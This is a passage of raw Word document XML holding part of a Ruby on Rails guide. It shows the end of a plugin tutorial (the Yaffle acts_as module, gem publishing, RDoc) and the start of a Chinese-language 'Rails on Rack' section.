              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>module</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>Yaffle</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="727E8DA5" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  module</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>ActsAsYaffle</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7C0CF610" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    extend ActiveSupport::Concern</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1848BF39" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:r>
              <w:t> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="39DCA77A" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    included do</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6111CEE2" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    end</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="033A8C99" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:r>
              <w:t> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="78306A8C" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    module</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>ClassMethods</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="74747A10" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>      def</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>acts_as_yaffle(options = {})</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="337BBCA9" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>        cattr_accessor :yaffle_text_field</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2D017B2F" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>        self.yaffle_text_field = (options[:yaffle_text_field] || :last_squawk).to_s</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2CDF811C" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:r>
              <w:t> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1568CA25" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>        include Yaffle::ActsAsYaffle::LocalInstanceMethods</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="701F9F0B" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>      end</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="08254C48" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    end</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="19EC0D32" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:r>
              <w:t> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0FC302FF" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    module</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>LocalInstanceMethods</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="47569D38" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>      def</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>squawk(string)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="60DA4A1A" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>        write_attribute(self.class.yaffle_text_field, string.to_squawk)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3159C2B4" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>      end</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5B8F4583" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    end</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="226A8F6E" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  end</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6D0D2475" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2C3C90DE" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:r>
              <w:t> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2A8E71F0" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>ActiveRecord::Base.send :include, Yaffle::ActsAsYaffle</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="18259CFE" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Run </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>rake</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> one final time and you should see:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="6240"/>
      </w:tblGrid>
      <w:tr w:rsidR="00185CB6" w14:paraId="241780B9" w14:textId="77777777" w:rsidTr="00185CB6">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="7604755E" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6">
            <w:pPr>
              <w:divId w:val="913273345"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>7 tests, 7 assertions, 0 failures, 0 errors, 0 skips</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="34B21080" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The use of </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>write_attribute</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> to write to the field in model is just one example of how a plugin can interact with the model, and will not always be the right method to use. For example, you could also use </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>send(“#{self.class.yaffle_text_field}=”, string.to_squawk)</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2E2FC96E" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
      <w:pPr>
        <w:pStyle w:val="3"/>
      </w:pPr>
      <w:r>
        <w:t>5 Generators</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7A4F4D03" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Generators can be included in your gem simply by creating them in a lib/generators directory of your plugin. More information about the creation of generators can be found in the </w:t>
      </w:r>
      <w:hyperlink r:id="rId1100" w:history="1">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>Generators Guide</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="4F4A53F1" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
      <w:pPr>
        <w:pStyle w:val="3"/>
      </w:pPr>
      <w:r>
        <w:t>6 Publishing your Gem</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="71831519" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>Gem plugins currently in development can easily be shared from any Git repository. To share the Yaffle gem with others, simply commit the code to a Git repository (like Github) and add a line to the Gemfile of the application in question:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="6401"/>
      </w:tblGrid>
      <w:tr w:rsidR="00185CB6" w14:paraId="79B7F318" w14:textId="77777777" w:rsidTr="00185CB6">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="4CCD4409" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6">
            <w:pPr>
              <w:divId w:val="1208223066"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>gem 'yaffle', :git</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; '</w:t>
            </w:r>
            <w:hyperlink r:id="rId1101" w:history="1">
              <w:r>
                <w:rPr>
                  <w:rStyle w:val="a3"/>
                </w:rPr>
                <w:t>git://github.com/yaffle_watcher/yaffle.git</w:t>
              </w:r>
            </w:hyperlink>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>'</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="20F5DA27" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">After running </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>bundle install</w:t>
      </w:r>
      <w:r>
        <w:t>, your gem functionality will be available to the application.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="12BEDC84" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">When the gem is ready to be shared as a formal release, it can be published to </w:t>
      </w:r>
      <w:hyperlink r:id="rId1102" w:history="1">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>RubyGems</w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:t xml:space="preserve">. For more information about publishing gems to RubyGems, see: </w:t>
      </w:r>
      <w:hyperlink r:id="rId1103" w:history="1">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>http://blog.thepete.net/2010/11/creating-and-publishing-your-first-ruby.html</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="3F1E7F55" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
      <w:pPr>
        <w:pStyle w:val="3"/>
      </w:pPr>
      <w:r>
        <w:t>7 RDoc Documentation</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1007AF62" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>Once your plugin is stable and you are ready to deploy do everyone else a favor and document it! Luckily, writing documentation for your plugin is easy.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="11DFEB5E" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The first step is to update the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>README</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> file with detailed information about how to use your plugin. A few key things to include are:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5655216E" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="365"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:t>Your name</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1AF06037" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="365"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:t>How to install</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="12A7DD00" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="365"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:t>How to add the functionality to the app (several examples of common use cases)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4CD5F342" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="365"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:t>Warnings, gotchas or tips that might help users and save them time</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="46E215E6" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Once your </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>README</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> is solid, go through and add rdoc comments to all of the methods that developers will use. It’s also customary to add ‘#:nodoc:’ comments to those parts of the code that are not included in the public api.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6A6EFA1C" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>Once your comments are good to go, navigate to your plugin directory and run:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="1320"/>
      </w:tblGrid>
      <w:tr w:rsidR="00185CB6" w14:paraId="009509EB" w14:textId="77777777" w:rsidTr="00185CB6">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="3E7DF10B" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6">
            <w:pPr>
              <w:divId w:val="450903661"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>$ rake rdoc</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="70AA2475" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
      <w:pPr>
        <w:pStyle w:val="4"/>
      </w:pPr>
      <w:r>
        <w:t>7.1 References</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4A457D2A" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="008938C9" w:rsidP="00185CB6">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="366"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId1104" w:history="1">
        <w:r w:rsidR="00185CB6">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>Developing a RubyGem using Bundler</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="66DF7F69" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="008938C9" w:rsidP="00185CB6">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="366"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId1105" w:history="1">
        <w:r w:rsidR="00185CB6">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>Using Gemspecs As Intended</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="2727C01B" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="008938C9" w:rsidP="00185CB6">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="366"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId1106" w:history="1">
        <w:r w:rsidR="00185CB6">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>Gemspec Reference</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="3B0180EF" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="008938C9" w:rsidP="00185CB6">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="366"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId1107" w:history="1">
        <w:r w:rsidR="00185CB6">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>GemPlugins</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="43BC2259" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRPr="005D6D6E" w:rsidRDefault="00185CB6" w:rsidP="00185CB6"/>
    <w:p w14:paraId="237E7BC9" w14:textId="00F56298" w:rsidR="005D6D6E" w:rsidRDefault="002B5D47" w:rsidP="006E53E9">
      <w:pPr>
        <w:pStyle w:val="2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>6.2、</w:t>
      </w:r>
      <w:hyperlink r:id="rId1108" w:history="1">
        <w:r w:rsidR="005D6D6E">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>Rails on Rack</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="465FA47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本指南涵盖 Rails 与 Rack 及其他 Rack 组件的集成。参考本指南，你将能够：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5E361A69" w14:textId="77777777" w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w:rsidRDefault="004E5E0B" w:rsidP="004E5E0B">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="237"/>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创建 Rails Metal 应用</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5CA02787" w14:textId="77777777" w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w:rsidRDefault="004E5E0B" w:rsidP="004E5E0B">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="237"/>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在你的 Rails 应用中使用 Rack 中间件</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="071949C7" w14:textId="77777777" w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w:rsidRDefault="004E5E0B" w:rsidP="004E5E0B">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="237"/>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理解 Action Pack 的内部中间件堆栈</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="703001B3" w14:textId="77777777" w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w:rsidRDefault="004E5E0B" w:rsidP="004E5E0B">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="237"/>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定义定制的中间件堆栈</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7CBE28E2"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目录</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="263365DB" w14:textId="77777777" w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w:rsidRDefault="008938C9" w:rsidP="004E5E0B">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="238"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink r:id="rId1109" w:anchor="1" w:history="1">
        <w:r w:rsidR="004E5E0B" w:rsidRPr="004E5E0B">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>Rack 简介</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="1CD750DC" w14:textId="77777777" w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w:rsidRDefault="008938C9" w:rsidP="004E5E0B">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="238"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink r:id="rId1110" w:anchor="2" w:history="1">
        <w:r w:rsidR="004E5E0B" w:rsidRPr="004E5E0B">
          <w:rPr>
